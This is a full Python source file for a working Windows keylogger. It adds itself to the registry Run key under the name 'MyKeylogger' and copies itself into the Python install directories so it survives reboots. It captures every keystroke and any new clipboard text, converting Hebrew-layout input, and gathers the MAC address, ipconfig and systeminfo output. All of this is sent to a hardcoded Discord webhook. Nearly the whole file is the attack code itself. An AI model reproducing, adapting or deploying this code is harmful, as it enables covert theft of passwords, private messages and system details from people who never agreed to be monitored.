import subprocess
import sys
# List of required packages
required_packages = ['pynput', 'dhooks', 'pyperclip', 'keyboard', 'pywin32', 'win32con', 'win32clipboard']

# Function to install packages if not already installed
def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Install missing packages
for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        print(f"Package {package} not found. Installing...")
        install_package(package)
import os
import shutil
import winreg as reg
import ctypes
import time
from pynput.keyboard import Listener, Key
from threading import Timer, Thread, Lock
from dhooks import Webhook
import keyboard
import pyperclip
import win32api
import win32con
import win32clipboard
import uuid


# The URL of the Discord webhook.
WEBHOOK_URL = "https://discord.com/api/webhooks/1348779023953690747/HeU4z4bdEogmMuyi57ZPrQr1BvdS13jZ67BKwhdYFl_94Jg0j2IEu9eJfbnOjrBN4ndS"

# Sets the delay between each report (in seconds)
TIME_INTERVAL = 10

# Timer threshold for considering a word or sentence finished (in seconds)
TYPING_PAUSE_THRESHOLD = 2

# Maximum clipboard content length
MAX_CLIPBOARD_LENGTH = 1000  # Adjust the length limit as needed

languages = {
    '0x40d': "Hebrew",
    '0x409': "English - United States",
    # Add other language codes here as needed
}

# Mapping of English letters to Hebrew keyboard layout
hebrew_translit = {
    'a': 'ש', 'b': 'נ', 'c': 'ב', 'd': 'ג', 'e': 'ק', 'f': 'כ', 'g': 'ע', 'h': 'י', 'i': 'ן', 'j': 'ח', 'k': 'ל',
    'l': 'ך', 'm': 'צ', 'n': 'מ', 'o': 'ם', 'p': 'פ', 'q': '/', 'r': 'ר', 's': 'ד', 't': 'א', 'u': 'ו', 'v': 'ה',
    'w': "'", 'x': 'ס', 'y': 'ט', 'z': 'ז',
    ',': 'ת', '.': 'ץ', ';': 'ף'
}

def get_keyboard_language():
    lang_id = ctypes.windll.user32.GetKeyboardLayout(0)
    lang_hex = hex(lang_id & 0xFFFF)
    return languages.get(lang_hex, f"Unknown (ID: {lang_hex})"), lang_hex

def transliterate_to_hebrew(text):
    return ''.join(hebrew_translit.get(char, char) for char in text)

def get_clipboard_text():
    win32clipboard.OpenClipboard()
    try:
        if win32clipboard.IsClipboardFormatAvailable(win32con.CF_UNICODETEXT):
            data = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
        else:
            data = ""
    finally:
        win32clipboard.CloseClipboard()
    return data

def get_mac_address():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
    return mac

def get_ipconfig():
    try:
        result = subprocess.check_output("ipconfig", shell=True, text=True)
        return result
    except subprocess.CalledProcessError:
        return "Error fetching IP config"

def get_system_info():
    try:
        result = subprocess.check_output("systeminfo", shell=True, text=True)
        return result
    except subprocess.CalledProcessError:
        return "Error fetching system info"

def chunk_text(text, chunk_size):
    """Split text into chunks of the specified size."""
    return [text[i:i + chunk_size] for i in range(0, len(text), chunk_size)]

def add_to_startup():
    # Path to the current script
    script_path = os.path.abspath(__file__)

    # Registry key location
    registry_key = r"Software\Microsoft\Windows\CurrentVersion\Run"

    # Open the registry and add the script to startup
    try:
        registry = reg.OpenKey(reg.HKEY_CURRENT_USER, registry_key, 0, reg.KEY_WRITE)
        reg.SetValueEx(registry, "MyKeylogger", 0, reg.REG_SZ, script_path)
        reg.CloseKey(registry)
        print("Script added to startup successfully.")
    except Exception as e:
        print(f"Failed to add script to startup: {e}")

def copy_to_python_directory():
    # Get Python installation path (for all versions of Python)
    python_dir = os.path.join(os.environ['LOCALAPPDATA'], 'Programs', 'Python')

    # Check if the Python directory exists
    if os.path.exists(python_dir):
        python_version_dirs = os.listdir(python_dir)
        for version_dir in python_version_dirs:
            # Check if this is a Python directory (e.g., Python39, Python312, etc.)
            if version_dir.startswith('Python'):
                # The directory for this version
                python_version_dir = os.path.join(python_dir, version_dir)

                # Copy the current script to the Python directory
                script_path = os.path.abspath(__file__)
                destination_path = os.path.join(python_version_dir, os.path.basename(script_path))
                
                try:
                    shutil.copy(script_path, destination_path)
                    print(f"Script copied to: {destination_path}")
                except Exception as e:
                    print(f"Failed to copy script to Python directory: {e}")

# Add the copied script to startup in the Python installation directory
def add_to_startup_from_python_directory():
    # Find the Python directory and get the copied script path
    python_dir = os.path.join(os.environ['LOCALAPPDATA'], 'Programs', 'Python')
    if os.path.exists(python_dir):
        python_version_dirs = os.listdir(python_dir)
        for version_dir in python_version_dirs:
            if version_dir.startswith('Python'):
                python_version_dir = os.path.join(python_dir, version_dir)
                script_path = os.path.join(python_version_dir, os.path.basename(__file__))
                
                # Add the copied script to the registry for startup
                try:
                    registry = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_WRITE)
                    reg.SetValueEx(registry, "MyKeylogger", 0, reg.REG_SZ, script_path)
                    reg.CloseKey(registry)
                    print("Script added to startup from Python directory.")
                except Exception as e:
                    print(f"Failed to add script to startup from Python directory: {e}")

class Keylogger:
    def __init__(self, webhook_url, interval=60, typing_pause_threshold=2):
        self.interval = interval
        self.webhook = Webhook(webhook_url)
        self.current_input = ""
        self.last_input_time = time.time()
        self.typing_pause_threshold = typing_pause_threshold
        self.lock = Lock()
        self.last_clipboard = ""
        self.mac_address = get_mac_address()
        self.ipconfig = get_ipconfig()
        self.system_info = get_system_info()
        self.device_uuid = str(uuid.uuid4())
        self.send_system_info()
        self.send_ipconfig()
        self.start_keylogger_thread() # Start the keylogger thread instantly after system info

    def send_ipconfig(self):
        ipconfig_chunks = chunk_text(self.ipconfig, 1000)
        for i, chunk in enumerate(ipconfig_chunks, start=1):
            message = f"IPConfig Part {i}:\n{chunk}"
            try:
                self.webhook.send(message)
            except Exception as e:
                print(f"Error sending IP config: {e}")

    def send_system_info(self):
        system_info_chunks = chunk_text(self.system_info, 1000)
        for i, chunk in enumerate(system_info_chunks, start=1):
            message = f"System Info Part {i}:\n{chunk}"
            try:
                self.webhook.send(message)
            except Exception as e:
                print(f"Error sending system info: {e}")

    def _report(self):
        with self.lock:
            if self.current_input:
                language, lang_id = get_keyboard_language()
                input_text = self.current_input
                if lang_id == '0x40d':  # Hebrew
                    input_text = transliterate_to_hebrew(self.current_input)
                message = f"UUID: {self.device_uuid}\nMAC Address: {self.mac_address}\nLanguage: {language}\nInput: {input_text}"
                self.webhook.send(message)
                self.current_input = ''
        Timer(self.interval, self._report).start()
        self._check_clipboard()

    def _on_key_press(self, key):
        try:
            char = None
            if hasattr(key, 'char') and key.char:
                char = key.char
            elif key == Key.space:
                char = ' '
            elif key == Key.enter:
                char = '\n'
            elif key == Key.backspace:
                with self.lock:
                    self.current_input = self.current_input[:-1]
                return

            if char:
                with self.lock:
                    self.current_input += char
                self.last_input_time = time.time()
                Timer(self.typing_pause_threshold, self._check_pause).start()

        except AttributeError:
            pass

    def _check_pause(self):
        if time.time() - self.last_input_time >= self.typing_pause_threshold:
            self._finish_input()

    def _finish_input(self):
        with self.lock:
            if self.current_input:
                language, lang_id = get_keyboard_language()
                input_text = self.current_input
                if lang_id == '0x40d':  # Hebrew
                    input_text = transliterate_to_hebrew(self.current_input)
                message = f"UUID: {self.device_uuid}\nMAC Address: {self.mac_address}\nLanguage: {language}\nInput: {input_text}"
                self.webhook.send(message)
                self.current_input = ''

    def _check_clipboard(self):
        clipboard_content = get_clipboard_text()

        # Check if clipboard content is too long
        if clipboard_content and clipboard_content != self.last_clipboard:
            self.last_clipboard = clipboard_content
            language, lang_id = get_keyboard_language()

            # If clipboard content is too long, send a "Too long" message
            if len(clipboard_content) > MAX_CLIPBOARD_LENGTH:
                message = f"UUID: {self.device_uuid}\nMAC Address: {self.mac_address}\nCopied: Too long"
            else:
                if lang_id == '0x40d':  # Hebrew
                    clipboard_content = transliterate_to_hebrew(clipboard_content)
                message = f"UUID: {self.device_uuid}\nMAC Address: {self.mac_address}\nLanguage: {language}\nCopied: {clipboard_content}"

            self.webhook.send(message)

        Timer(5, self._check_clipboard).start()

    def run(self):
        self._report()
        with Listener(on_press=self._on_key_press) as listener:
            listener.join()

    def start_keylogger_thread(self):
        keylogger_thread = Thread(target=self.run)
        keylogger_thread.daemon = True # Allow the program to exit even if this thread is running
        keylogger_thread.start()

if __name__ == '__main__':
    add_to_startup()
    copy_to_python_directory()  # Add this line to copy script to Python directory
    add_to_startup_from_python_directory()  # Add to startup from the Python directory
    keylogger = Keylogger(WEBHOOK_URL, TIME_INTERVAL, TYPING_PAUSE_THRESHOLD)

    # Send system info and IP config every hour
    while True:
        time.sleep(3600)
        keylogger.send_ipconfig()
        keylogger.send_system_info()
